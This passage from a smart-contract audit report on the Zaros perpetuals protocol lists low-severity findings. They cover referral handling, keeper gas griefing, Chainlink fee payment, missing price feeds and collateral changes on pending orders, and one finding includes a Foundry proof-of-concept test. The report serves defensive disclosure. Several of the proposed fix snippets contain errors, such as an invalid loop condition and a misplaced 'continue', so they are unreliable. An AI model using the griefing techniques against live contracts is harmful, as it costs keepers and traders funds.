        //@audit-issue => All the TradingAccounts owned by the same msg.sender are forced to use the same referral code.
        Referral.Data storage referral = Referral.load(msg.sender);

        if (referralCode.length != 0 && referral.referralCode.length == 0) {
            if (isCustomReferralCode) {
                CustomReferralConfiguration.Data storage customReferral =
                    CustomReferralConfiguration.load(string(referralCode));
                if (customReferral.referrer == address(0)) {
                    revert Errors.InvalidReferralCode();
                }
                referral.referralCode = referralCode;
                referral.isCustomReferralCode = true;
            } else {
                address referrer = abi.decode(referralCode, (address));

                if (referrer == msg.sender) {
                    revert Errors.InvalidReferralCode();
                }

                referral.referralCode = referralCode;
                referral.isCustomReferralCode = false;
            }

            emit LogReferralSet(msg.sender, referral.getReferrerAddress(), referralCode, isCustomReferralCode);
        }

        return tradingAccountId;
    }
```

## Impact
Traders are forced to use the same referral code across all of their accounts.

## Tools Used
Manual Audit

## Recommendations
Handle the referral at a TradingAccount level. Allow Account owners to set a different referral code on each of their TradingAccounts.

------
# L-04
## Title
Users can grief the Offchain keeper to waste gas by submitting invalid offchain orders causing the tx to revert, and as such, all the valid orders submited on the same batch will also revert

## Vulnerability Details
When filling an offchain order, [the execution validates if the signer of the current offchain order being filled is actually the owner of the TradingAccount that the order was requested for](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/SettlementBranch.sol#L260-L270). The grieffing is possible because if the signer is not the owner, the entire tx is reverted, and, by reverting the entire tx, the rest of valid orders that could have been filled will also be reverted.

The attacker spends 0 gas because signing an offchain message costs nothing, its free.

This allows attackers to submit offchain orders for TradingAccounts they don't own and that the filling offchain order execution will revert. This will cause that the offchain keeper txs reverts and spends gas on attempting to fill an offchain order that will revert anyways.

```
function fillOffchainOrders(
    uint128 marketId,
    OffchainOrder.Data[] calldata offchainOrders,
    bytes calldata priceData
)
    external
    onlyOffchainOrdersKeeper(marketId)
{
    ...

    for (uint256 i; i < offchainOrders.length; i++) {
        ...

        //@audit => Recovering the original signer of the offchain signature requesting an OffchainOrder!
        // `ecrecover`s the order signer.
        ctx.signer = ECDSA.recover(
            _hashTypedDataV4(ctx.structHash), ctx.offchainOrder.v, ctx.offchainOrder.r, ctx.offchainOrder.s
        );

        // ensure the signer is the owner of the trading account, otherwise revert.
        // NOTE: If an account's owner transfers to another address, this will fail. Therefore, clients must
        // cancel all users offchain orders in that scenario.

        //@audit-issue => Reverting instead of continuing to the next offchain order!
        if (ctx.signer != tradingAccount.owner) {
            revert Errors.InvalidOrderSigner(ctx.signer, tradingAccount.owner);
        }

        ...
    }
}

```

## Impact
Malicious user can make the Offchain Keeper to waste infinite gas without them spending a single wei of gas.

## Tools Used
Manual Audit

## Recommendations
Instead of reverting the tx, do a continue, in this way, the rest of valid orders can still be filled. All good with doing a continue, at this point, nothing has been saved in the storage related to the current order beeing filled.


------
# L-05
## Title
MarketOrders don't have price protection when being filled.

## Vulnerability Details
Traders who uses MarketOrders can not protected themselves against the price of the asset [when their order is filled](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/SettlementBranch.sol#L107-L166). In comparisson against the offchain orders, [Offchain Orders are protected to be filled within a correct range of price](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/SettlementBranch.sol#L236-L238) to allow the Trader execute the trade as planned.


## Impact
MarketOrders can be filled even if the filled price is not valid depending on the type of operation.

## Tools Used
Manual Audit

## Recommendations
Similar to when filling an offchain order, make sure to validate if the fillPrice is valid when filling MarketOrders.

This change will require to allow the Traders to define the `targetPrice` of their order when creating a MarketOrder!

```
function fillMarketOrder(
    uint128 tradingAccountId,
    uint128 marketId,
    bytes calldata priceData
)
    external
    onlyMarketOrderKeeper(marketId)
{
    ...

    //  buy order -> match against the ask price
    // sell order -> match against the bid price
    ctx.indexPriceX18 = ctx.isBuyOrder ? ctx.askX18 : ctx.bidX18;

    // verify the provided price data against the verifier and ensure it's valid, then get the mark price
    // based on the returned index price.
    ctx.fillPriceX18 = perpMarket.getMarkPrice(ctx.sizeDeltaX18, ctx.indexPriceX18);

    //@audit => Verify if the fillPrice is correct
    bool isFillPriceValid = (ctx.isBuyOrder && marketOrder.targetPrice <= ctx.fillPriceX18.intoUint256())
                || (!ctx.isBuyOrder && marketOrder.targetPrice >= ctx.fillPriceX18.intoUint256());

    if (!ctx.isFillPriceValid) {
        continue;
    }

    // perform the fill
    _fillOrder(
        tradingAccountId,
        marketId,
        SettlementConfiguration.MARKET_ORDER_CONFIGURATION_ID,
        ctx.sizeDeltaX18,
        ctx.fillPriceX18
    );

    // reset pending order details
    marketOrder.clear();
}

```
# L-06
## Title
Returning an empty array when checking the amount of liquidable accounts.

## Vulnerability Details
When the total amounts to be liquidated is <= the `peformLowerBound`, the [`LiquidationKeeper.checkUpkeep() function`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/external/chainlink/keepers/liquidation/LiquidationKeeper.sol#L44-L88) returns an empty array, instead of returning the array that contains the accounts that can be liquidated.

```
function checkUpkeep(bytes calldata checkData)
    external
    view
    returns (bool upkeepNeeded, bytes memory performData)
{
    (uint256 checkLowerBound, uint256 checkUpperBound, uint256 performLowerBound, uint256 performUpperBound) =
        abi.decode(checkData, (uint256, uint256, uint256, uint256));

    if (checkLowerBound >= checkUpperBound || performLowerBound >= performUpperBound) {
        revert Errors.InvalidBounds();
    }

    IPerpsEngine perpsEngine = _getLiquidationKeeperStorage().perpsEngine;

    //@audit => Checks the accounts from `checLowerBound to checkUpperBound` and determines which accounts are liquidables!
    uint128[] memory liquidatableAccountsIds =
        perpsEngine.checkLiquidatableAccounts(checkLowerBound, checkUpperBound);
    uint128[] memory accountsToBeLiquidated;

    if (liquidatableAccountsIds.length == 0 || liquidatableAccountsIds.length <= performLowerBound) {
        
        //@audit-issue => Returning the empty array.
        //@audit => The array that has the liquidable accounts is the `liquidatableAccountsIds`
        performData = abi.encode(accountsToBeLiquidated);

        return (upkeepNeeded, performData);
    }
}
```

## Impact
The function would return an empty array which means that there are no liquidable accounts, when in reality, there can be accounts to be liquidated.

## Tools Used
Manual Audit

## Recommendations
Return the `liquidatableAccountsIds` array instead of `accountsToBeLiquidated`

```
function checkUpkeep(bytes calldata checkData)
    external
    view
    returns (bool upkeepNeeded, bytes memory performData)
{
    (uint256 checkLowerBound, uint256 checkUpperBound, uint256 performLowerBound, uint256 performUpperBound) =
        abi.decode(checkData, (uint256, uint256, uint256, uint256));

    if (checkLowerBound >= checkUpperBound || performLowerBound >= performUpperBound) {
        revert Errors.InvalidBounds();
    }

    IPerpsEngine perpsEngine = _getLiquidationKeeperStorage().perpsEngine;

    uint128[] memory liquidatableAccountsIds =
        perpsEngine.checkLiquidatableAccounts(checkLowerBound, checkUpperBound);
    uint128[] memory accountsToBeLiquidated;

    if (liquidatableAccountsIds.length == 0 || liquidatableAccountsIds.length <= performLowerBound) {
        

+       performData = abi.encode(liquidatableAccountsIds);
-       performData = abi.encode(accountsToBeLiquidated);

        return (upkeepNeeded, performData);
    }
}
```

------
# L-07
## Title
No means for the PerpEngine to receive native to pay the Chainlink Verifier in case Chainlinks charges fees to the protocol

## Vulnerability Details
To [verify a report on the Chainlink DataStreams is required to pay a fee](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/external/chainlink/ChainlinkUtil.sol#L95-L104). At the moment, the protocol has an arrenguement with Chainlink to not pay fees. But, in case in the future is required to pay for these fees, the contracts don't have any means to receive native tokens so that it can be used to pay for fees.

```
    function verifyReport(
        IVerifierProxy chainlinkVerifier,
        FeeAsset memory fee,
        bytes memory signedReport
    )
        internal
        returns (bytes memory verifiedReportData)
    {
        
        //@audit-issue => Contracts don't have a mechanism to receive native token so that it can be used to pay for these fees.
        verifiedReportData = chainlinkVerifier.verify{ value: fee.amount }(signedReport, abi.encode(fee.assetAddress));
    }

```

## Impact
The contracts won't be able to verify the report on the Chainlink DataStream, which that would cause a disruption to the system.

## Tools Used
Manual Audit

## Recommendations
Add a function that would allow the owners to fund the PerpsEngine contract with native token to pay for fees.

------
# L-08
## Title
Order of liquidation would liquidate collaterals with higher LTV first

## Vulnerability Details
When deducting margin from an account, [the collateralLiquidationPriority is iterated from the first item to the last](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/TradingAccount.sol#L504-L508). If the order of the collateralLiquidation goes from collateral with the highest LTV to the collaterals with the lower LTV at the end, then, the collateral deducted from the TradingAccounts would first take the most stable collaterals.

```
function deductAccountMargin(
    ...
)
    internal
    returns (UD60x18 marginDeductedUsdX18)
{
    ...

    // cache collateral liquidation priority length
    uint256 cachedCollateralLiquidationPriorityLength = globalConfiguration.collateralLiquidationPriority.length();

    //@audit-issue => Iterating from the first item to the last
    // loop through configured collateral types
    for (uint256 i; i < cachedCollateralLiquidationPriorityLength; i++) {
        // get ith collateral type
        address collateralType = globalConfiguration.collateralLiquidationPriority.at(i);
        ...
    }
}
```

## Impact
Most stable collateral will be deducted first, leaving the TradingAccounts with a riskier basket of collaterals.

## Tools Used
Manual Audit

## Recommendations
Iterate from the last to the first collateral in the collateralLiquidationPriority.

```
function deductAccountMargin(
    ...
)
    internal
    returns (UD60x18 marginDeductedUsdX18)
{
    ...

    // cache collateral liquidation priority length
    uint256 cachedCollateralLiquidationPriorityLength = globalConfiguration.collateralLiquidationPriority.length();

    // loop through configured collateral types
+   for (uint256 i = cachedCollateralLiquidationPriorityLength - 1; i = 0; i--) {
-   for (uint256 i; i < cachedCollateralLiquidationPriorityLength; i++) {
        // get ith collateral type
        address collateralType = globalConfiguration.collateralLiquidationPriority.at(i);
        ...
    }
}
````

## <a id='L-02'></a>L-02. Offchain orders are not cancelled after the account has been liquidated

_Submitted by [qpzm](https://profiles.cyfrin.io/u/qpzm), [bigsam](https://profiles.cyfrin.io/u/bigsam), [greed](https://profiles.cyfrin.io/u/greed), [0x1982us](https://profiles.cyfrin.io/u/0x1982us), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro). Selected submission by: [greed](https://profiles.cyfrin.io/u/greed)._      
            


## Summary

In the previous version of Zaros, users were only allowed to create on-chain orders using the [`OrderBranch::createMarketOrder()`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/OrderBranch.sol#L242-L355) function.

This would create a pending order that keepers would be able to fill later on.

In case the account is liquidated before the order is filled, the order is cancelled to prevent the account from having a position they did not intend to have after their liquidation.

This is done through the following line in [`LiquidationBranch::liquidateAccounts()`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/LiquidationBranch.sol#L164)

```solidity
L164:     MarketOrder.load(ctx.tradingAccountId).clear();
```

## Vulnerability Details

In this new version Zaros has introduced off-chain orders that users sign on the frontend and the logic for filling them has been added to [`SettlementBranch::fillOffchainOrders()`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/SettlementBranch.sol)

However, upon liquidation, these orders are not cancelled like the *__pending market orders__* are.

## Impact

This can negatively impact users and result in the users unintentionally opening a new position (and subtracting fees from their collateral) while they would not want after being liquidated.

The following coded PoC demonstrates a scenario in which a user has a long position and wants to reduce it by supplying a negative delta using off-chain orders. However the price of the longed asset crashes and keepers liquidate his position. After the liquidation, keepers fulfill his pending off-chain order, basically creating a new short position which the user did not intend to.

The test can be pasted in *test\integration\perpetuals\settlement-branch\fillOffchainOrders\fillOffchainOrders.t.sol*

```solidity
/* @audit-info need to import :
    import { UD60x18, ud60x18 } from "@prb-math/UD60x18.sol";
*/
function testOffchainOrdersNotCancelled() external {
    uint256 ethBalance = 1e18;
    int128 tradeSize = 10e18;
    uint128 marketId = ETH_USD_MARKET_ID;
    uint256 price = MOCK_ETH_USD_PRICE;

    deal({ token: address(wEth), to: users.naruto.account, give: ethBalance });

    vm.startPrank(users.naruto.account);
    uint128 tradingAccountId = createAccountAndDeposit(ethBalance, address(wEth));

    changePrank({ msgSender: users.naruto.account });
    openManualPosition(marketId, ETH_USD_STREAM_ID, price, tradingAccountId, tradeSize);

    price = MOCK_ETH_USD_PRICE - 100e18;
    updateMockPriceFeed(marketId, price);

    // account is not yet liquidatable
    uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(liquidatableAccountsIds[0], 0);

    // user wants to reduce his exposure
    changePrank({ msgSender: users.naruto.account });
    tradeSize = -5e18;

    uint128 markPrice = perpsEngine.getMarkPrice(
        marketId, price, tradeSize
    ).intoUint128();

    bytes32 salt = bytes32(block.prevrandao);
    bytes32 structHash = keccak256(
        abi.encode(
            Constants.CREATE_OFFCHAIN_ORDER_TYPEHASH,
            tradingAccountId,
            marketId,
            tradeSize,
            markPrice,
            false,
            uint120(0),
            salt
        )
    );

    // user signs and "sends" the order to Zaros
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", perpsEngine.DOMAIN_SEPARATOR(), structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign({ privateKey: users.naruto.privateKey, digest: digest });

    // price crashes until to a point where account is liquidatable
    price = MOCK_ETH_USD_PRICE / 2;
    updateMockPriceFeed(ETH_USD_MARKET_ID, price);

    // account is liquidatable
    liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(liquidatableAccountsIds[0], 1);

    // account is liquidated
    changePrank({ msgSender: liquidationKeeper });
    perpsEngine.liquidateAccounts(liquidatableAccountsIds);

    // keepers execute the off-chain order
    // here we reconstruct the off-chain order of the user with its wanted values
    OffchainOrder.Data[] memory offchainOrders = new OffchainOrder.Data[](1);
    offchainOrders[0] = OffchainOrder.Data({
        tradingAccountId: tradingAccountId,
        marketId: marketId,
        sizeDelta: tradeSize,
        targetPrice: markPrice,
        shouldIncreaseNonce: false,
        nonce: 0,
        salt: salt,
        v: v,
        r: r,
        s: s
    });

    bytes memory mockSignedReport = getMockedSignedReport(ETH_USD_STREAM_ID, price);
    changePrank({ msgSender: OFFCHAIN_ORDERS_KEEPER_ADDRESS });
    perpsEngine.fillOffchainOrders(marketId, offchainOrders, mockSignedReport);

    // it should fill the offchain order
    bool hasOffchainOrderBeenFilled = TradingAccountHarness(address(perpsEngine))
        .workaround_hasOffchainOrderBeenFilled(tradingAccountId, structHash);
    assertTrue(hasOffchainOrderBeenFilled, "hasOffchainOrderBeenFilled");

    // account is not liquidatable anymore
    liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(liquidatableAccountsIds[0], 0);

    // the account maintenance margin is not 0 meaning it has an opened position
    (,,UD60x18 maintenanceMarginUsdX18,) = perpsEngine.getAccountMarginBreakdown(tradingAccountId);
    assertNotEq(maintenanceMarginUsdX18.intoUint256(), 0);
}
```

## Tools Used

Manual review

## Recommendations

Just like classic on-chain market orders are cancelled after liquidation, off-chain orders should also be cancelled.

## <a id='L-03'></a>L-03. Functions calling `verifyReport` to verify offchain prices from chainlink will fail

_Submitted by [Reentrants](https://codehawks.cyfrin.io/team/cly3oauyy000d26pej6o3uazr), [ke1cam](https://profiles.cyfrin.io/u/ke1cam), [spearmint](https://profiles.cyfrin.io/u/spearmint), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [blutorque](https://profiles.cyfrin.io/u/blutorque), [AuditTemple](https://codehawks.cyfrin.io/team/clyo65dx70009vjk4le7hszsf), [0xstalin](https://profiles.cyfrin.io/u/0xstalin), [inzinko](https://profiles.cyfrin.io/u/inzinko), [infect3d](https://profiles.cyfrin.io/u/infect3d), [inh3l](https://profiles.cyfrin.io/u/inh3l), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [alexczm](https://profiles.cyfrin.io/u/alexczm). Selected submission by: [inh3l](https://profiles.cyfrin.io/u/inh3l)._      
            


##### Relevant GitHub Links

<https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/external/chainlink/ChainlinkUtil.sol#L103>

## Summary

Missing payable and approval functionalities to send verifier fees to chainlink's feemanager contract.

## Vulnerability Details

In ChainlinkUtil.sol, there's the `verifyReport` function which is used to verify chainlink prices using chainlinkVerifier contract. The function is intended to send the fee amount in ETH to VerifierProxy.sol, we can see that the call to chainlink verifier attempts to send the `fee.amount` as ETH.

```solidity
    function verifyReport(
        IVerifierProxy chainlinkVerifier,
        FeeAsset memory fee,
        bytes memory signedReport
    )
        internal
        returns (bytes memory verifiedReportData)
    {
        verifiedReportData = chainlinkVerifier.verify{ value: fee.amount }(signedReport, abi.encode(fee.assetAddress)); //@note
    }
```

And as can be seen from [VerifierProxy.sol](https://github.com/smartcontractkit/chainlink/blob/9e74eee9d415b386db33bdf2dd44facc82cd3551/contracts/src/v0.8/llo-feeds/VerifierProxy.sol#L127), the function expects and uses msg.value as fee amount.

```solidity
  function verify(
    bytes calldata payload,
    bytes calldata parameterPayload
  ) external payable checkAccess returns (bytes memory) {
    IVerifierFeeManager feeManager = s_feeManager;

    // Bill the verifier
    if (address(feeManager) != address(0)) {
      feeManager.processFee{value: msg.value}(payload, parameterPayload, msg.sender);
    }

    return _verify(payload);
  }
```

This is all well and good, however, none the functions calling the `verifyReport` function are payable, nor do they have a receive functionality with which they can receive and later forward the ETH fee to the verifier contract.

To prove this, we'll follow the function logic.
Using the [search functionality](https://github.com/search?q=repo%3ACyfrin%2F2024-07-zaros+verifyReport%28\&type=code), we can see that the `verifyReport` function is called in SettlementConfiguration.sol library in the `verifyDataStreamsReport` function. The function as can be seen is not marked payable, nor does the library hold a source of receiving ETH.

```solidity
    function verifyDataStreamsReport(
        DataStreamsStrategy memory dataStreamsStrategy,
        bytes memory signedReport
    )
        internal
        returns (bytes memory verifiedReportData)
    {
        IVerifierProxy chainlinkVerifier = dataStreamsStrategy.chainlinkVerifier;

        bytes memory reportData = ChainlinkUtil.getReportData(signedReport);
        (FeeAsset memory fee) = ChainlinkUtil.getEthVericationFee(chainlinkVerifier, reportData);
        verifiedReportData = ChainlinkUtil.verifyReport(chainlinkVerifier, fee, signedReport);  //@note
    }
```

And in [searching](https://github.com/search?q=repo%3ACyfrin%2F2024-07-zaros+%22verifyDataStreamsReport%28%22\&type=code) for `verifyDataStreamsReport` function, we discover it's also in use in the `verifyOffchainPrice` function, also in SettlementConfiguration.sol. And as can be observed, the function is not marked payable, nor does the librarys have any way of receiving ETH.

```solidity
    function verifyOffchainPrice(
        Data storage self,
        bytes memory priceData,
        uint256 maxVerificationDelay
    )
        internal
        returns (UD60x18 bidX18, UD60x18 askX18)
    {
        if (self.strategy == Strategy.DATA_STREAMS_DEFAULT) {
            DataStreamsStrategy memory dataStreamsStrategy = abi.decode(self.data, (DataStreamsStrategy));
            bytes memory verifiedPriceData = verifyDataStreamsReport(dataStreamsStrategy, priceData);  //@note 

            requireDataStreamsReportIsValid(dataStreamsStrategy.streamId, verifiedPriceData, maxVerificationDelay);

            PremiumReport memory premiumReport = abi.decode(verifiedPriceData, (PremiumReport));

            (bidX18, askX18) =
                (ud60x18(int256(premiumReport.bid).toUint256()), ud60x18(int256(premiumReport.ask).toUint256()));
        } else {
            revert Errors.InvalidSettlementStrategy();
        }
    }
```

Repeating the [search process](https://github.com/search?q=repo%3ACyfrin%2F2024-07-zaros+%22verifyOffchainPrice%28%22\&type=code), we discover that `verifyOffchainPrice` is used in two major functions in SettlementBranch.sol. The `fillMarketOrder` and the `fillOffchainOrders` which are called by their keeper respective keepers.

```solidity
    function fillMarketOrder(
        uint128 tradingAccountId,
        uint128 marketId,
        bytes calldata priceData
    )
        external
        onlyMarketOrderKeeper(marketId)
    {
//...
        // verifies provided price data following the configured settlement strategy
        // returning the bid and ask prices
        (ctx.bidX18, ctx.askX18) =
            settlementConfiguration.verifyOffchainPrice(priceData, globalConfiguration.maxVerificationDelay);
//...
    }
```

```solidity
function fillOffchainOrders(
        uint128 marketId,
        OffchainOrder.Data[] calldata offchainOrders,
        bytes calldata priceData
    )
        external
        onlyOffchainOrdersKeeper(marketId)
    {
//...
        // verifies provided price data following the configured settlement strategy
        // returning the bid and ask prices
        (ctx.bidX18, ctx.askX18) =
            settlementConfiguration.verifyOffchainPrice(priceData, globalConfiguration.maxVerificationDelay);
//...
```

Notice that these functions are also not marked payable, neither does the contract have a way of receiving ETH due to its lack of the `receive` functionality.
As a result, calls to these functions, will fail if the `fee.amount` is > 0 as ETH is not sent.

Now, Chainlink probabaly expected this and therefore allows the subscribers to pay in WETH instead, as the native token if ETH is not sent. Following the logic chain from the [`verify`](https://github.com/smartcontractkit/chainlink/blob/9e74eee9d415b386db33bdf2dd44facc82cd3551/contracts/src/v0.8/llo-feeds/VerifierProxy.sol#L132) function in VerifierProxy.sol, the function attempts to process fees in the fee manager through the `processFee` function.

```solidity
  function verify(
    bytes calldata payload,
    bytes calldata parameterPayload
  ) external payable checkAccess returns (bytes memory) {
    IVerifierFeeManager feeManager = s_feeManager;

    // Bill the verifier
    if (address(feeManager) != address(0)) {
      feeManager.processFee{value: msg.value}(payload, parameterPayload, msg.sender);
    }

    return _verify(payload);
  }
```

In the [`processFee`](https://github.com/smartcontractkit/chainlink/blob/9e74eee9d415b386db33bdf2dd44facc82cd3551/contracts/src/v0.8/llo-feeds/FeeManager.sol#L194) function, the `_handleFeesAndRewards` is called using parameters for `i_nativeAddress` not `i_linkaddress` since our chainlinkUtil library uses [that](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/external/chainlink/ChainlinkUtil.sol#L83-L93) as our fee token and fee amount source.

```solidity
  function processFee(
    bytes calldata payload,
    bytes calldata parameterPayload,
    address subscriber
  ) external payable override onlyProxy {
//...
    if (fee.assetAddress == i_linkAddress) {
      _handleFeesAndRewards(subscriber, feeAndReward, 1, 0);
    } else {
      _handleFeesAndRewards(subscriber, feeAndReward, 0, 1);
    }
  }
```

In [`_handleFeesAndRewards`](https://github.com/smartcontractkit/chainlink/blob/9e74eee9d415b386db33bdf2dd44facc82cd3551/contracts/src/v0.8/llo-feeds/FeeManager.sol#L441-L457), we can see how the fee is handled. If msg.value is not sent, an attempt is made to transfer the `i_nativeAddress` from the subscriber, in this case, our msg.sender in VerifierProxy.sol, which is the contract that started the entire chain, (not the libraries) which is SettlementBranch.sol.

```solidity
  function _handleFeesAndRewards(
    address subscriber,
    FeeAndReward[] memory feesAndRewards,
    uint256 numberOfLinkFees,
    uint256 numberOfNativeFees
  ) internal {
//...
    if (msg.value != 0) {
      //there must be enough to cover the fee
      if (totalNativeFee > msg.value) revert InvalidDeposit();

      //wrap the amount required to pay the fee & approve as the subscriber paid in wrapped native
      IWERC20(i_nativeAddress).deposit{value: totalNativeFee}();

      unchecked {
        //msg.value is always >= to fee.amount
        change = msg.value - totalNativeFee;
      }
    } else {
      if (totalNativeFee != 0) {
        //subscriber has paid in wrapped native, so transfer the native to this contract
        IERC20(i_nativeAddress).safeTransferFrom(subscriber, address(this), totalNativeFee);
      }
    }
//...
  }
```

And by [going through](https://github.com/search?q=repo%3ACyfrin%2F2024-07-zaros+%22approve%22\&type=code) SettlementBranch.sol, or the entire codebase, there's no instance of the the FeeManager being approved to transfer `i_nativeAddress` tokens, which according to [arbiscan](https://arbiscan.io/address/0x5d70bd17b04efc1a1846177a49897fa532037df8#readContract#F3) is WETH.

## Impact

In conclusion, any of the functions that require offchain price verification stand the risk of failure, due to fees not being sent as ETH, or chainlink's fee manager being approved to transfer its wrapped counter part. And as a result, such functions will fail.
The function chain to follow goes like this:

`verifyReport` -> `verifyDataStreamsReport` ->  `verifyOffchainPrice` -> `fillOffchainOrders` & `fillMarketOrder`
`fillMarketOrder` is further user in MarketOrderKeeper.sol in the `performUpkeep` function.

## Tools Used

Manual Code Review

## Recommendations

Introduce a payable or receive functionality in the needed contract. Alternatively, approve the feemanager to spend the feeamount of the nativeaddress token before verification.

## <a id='L-04'></a>L-04. Liquidation of accounts collateral not posible because some chainlink price feed doesn't exist or are marked as medium risk by chainlink

_Submitted by [nfmelendez](https://profiles.cyfrin.io/u/nfmelendez), [0xaman](https://profiles.cyfrin.io/u/0xaman), [spearmint](https://profiles.cyfrin.io/u/spearmint), [krisp](https://profiles.cyfrin.io/u/krisp), [samuraii77](https://profiles.cyfrin.io/u/samuraii77), [auditism](https://profiles.cyfrin.io/u/auditism), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [aamirusmani1552](https://profiles.cyfrin.io/u/aamirusmani1552), [draiakoo](https://profiles.cyfrin.io/u/draiakoo), [AuditTemple](https://codehawks.cyfrin.io/team/clyo65dx70009vjk4le7hszsf), [0xshoonya](https://profiles.cyfrin.io/u/0xshoonya), [0xabhayy](https://profiles.cyfrin.io/u/0xabhayy), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro). Selected submission by: [nfmelendez](https://profiles.cyfrin.io/u/nfmelendez)._      
            


## Liquidation of accounts collateral not posible because some chainlink price feed doesn't exist or are marked as medium risk by chainlink

## Summary

Some price feeds doesn't exist or are marked as "medium risk" by chainlink.

## Vulnerability Details

Chainlink price feed for `WeETH / USD` and `WstETH / USD`  doesn't exist in arbitrum so is not possible to liquidate an account with those collaterals. Also `WETH / USD` price feed doesn't exist in arbitrum but exists ETH/USD, however current implementation doens't allow composition of price feeds. `WBTC / USD` and ` BNB/USD` are marked as medium risk by chainlink so the liquidation is possible but with some degree of risk.

### Collateral Chainlink Price Feed Analysis

| Feed         | Chainlink feed exits | Observation                          | Details                                                                             |
| ------------ | -------------------- | ------------------------------------ | ----------------------------------------------------------------------------------- |
| USDC / USD   | Y                    | green - low risk                     | [Feed link](https://arbiscan.io/address/0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3) |
| WBTC / USD   | Y                    | yellow - medium risk                 | [Feed Link](https://arbiscan.io/address/0xd0C7101eACbB49F3deCcCc166d238410D6D46d57) |
| WeETH / USD  | N                    | -                                    | -                                                                                   |
| WETH / USD   | N                    | Exist ETH/USD not the same but close | [Feed Link](https://arbiscan.io/address/0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612) |
| WstETH / USD | N                    | -                                    | -                                                                                   |
| USDZ  / USD  | N                    | Is the protocol token so no problem  | -                                                                                   |

### Markets Chainlink Price Feed Analysis

| Feed      | Chainlink feed exits | Observation          | Details                                                                             |
| --------- | -------------------- | -------------------- | ----------------------------------------------------------------------------------- |
| ARB/USD   | Y                    | green - low risk     | [Feed Link](https://arbiscan.io/address/0xb2A824043730FE05F3DA2efaFa1CBbe83fa548D6) |
| BNB/USD   | Y                    | yellow - medium risk | [Feed Link](https://arbiscan.io/address/0x6970460aabF80C5BE983C6b74e5D06dEDCA95D4A) |
| BTC/USD   | Y                    | green -low risk      | [Feed Link](https://arbiscan.io/address/0x6ce185860a4963106506C203335A2910413708e9) |
| DOGE/USD  | Y                    | green - low risk     | [Feed Link](https://arbiscan.io/address/0x9A7FB1b3950837a8D9b40517626E11D4127C098C) |
| ETH/USD   | Y                    | green - low risk     | [Feed Link](https://arbiscan.io/address/0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612) |
| FTM/USD   | Y                    | green - low risk     | [Feed Link](https://arbiscan.io/address/0xFeaC1A3936514746e70170c0f539e70b23d36F19) |
| LINK/USD  | Y                    | green - low risk     | [Feed Link](https://arbiscan.io/address/0x86E53CF1B870786351Da77A57575e79CB55812CB) |
| LTC/USD   | Y                    | gren - low risk      | [Feed link](https://arbiscan.io/address/0x5698690a7B7B84F6aa985ef7690A8A7288FBc9c8) |
| MATIC/USD | Y                    | green - low risk     | [Feed Link](https://arbiscan.io/address/0x52099D4523531f678Dfc568a7B1e5038aadcE1d6) |
| SOL/USD   | Y                    | green - low risk     | [Feed link](https://arbiscan.io/address/0x24ceA4b8ce57cdA5058b924B9B9987992450590c) |

## Impact

* Liquidation regarding Accounts: Can't liquidate if there is no Chainlink price feed for a collateral, for example WeETH/USD. Also WBTC/USD is marked as medium risk by chainlink.
* Liquidation regarding Markets: Liquidation is possible but the price feed BNB/USD is marked as "Medium Risk" by chainlink.

## Tools Used

* VS Code
* [Chainlink trusted price feed site](https://docs.chain.link/data-feeds/price-feeds/addresses?network=arbitrum\&page=1)
* [Selecting quality of feed](https://docs.chain.link/data-feeds/selecting-data-feeds)



## Recommendations

Protocol Will need to deploy and maintain custom price feeds that are missing or not trusted.

## <a id='L-05'></a>L-05. Attacker can abuse the system by modifying the collateral of pending orders

_Submitted by [giraffe0x](https://profiles.cyfrin.io/u/giraffe0x), [spearmint](https://profiles.cyfrin.io/u/spearmint), [AuditTemple](https://codehawks.cyfrin.io/team/clyo65dx70009vjk4le7hszsf), [0xlandlady](https://profiles.cyfrin.io/u/0xlandlady), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [Reentrants](https://codehawks.cyfrin.io/team/cly3oauyy000d26pej6o3uazr), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro). Selected submission by: [Reentrants](https://codehawks.cyfrin.io/team/cly3oauyy000d26pej6o3uazr)._      
            


## Summary

When a user creates an order, it enters a pending state. To activate the order, Zaros' `Keeper` must execute `fillOrder`. However, there is a critical issue in the process:

Users must deposit collateral when creating an order, but there are no restrictions on modifying it while pending. This allows risk profile manipulation and systemic risks to the protocol. Additionally, users can withdraw all collateral from pending orders, causing undercollateralization and a denial of service (DoS) by preventing order execution.

This problem has been identified in Synthetix protocol in previous audits/PRs: 

<https://github.com/Synthetixio/synthetix-v3/pull/1711>

<https://iosiro.com/audits/izar-release-smart-contract-audit#5.5.1-restrict-functions-that-could-affect-positions-with-pending-delayed-orders-(medium-risk)>

However, in Zaros, this issue is worsened because users can withdraw **all** their collateral while having pending orders.

## Vulnerability Details

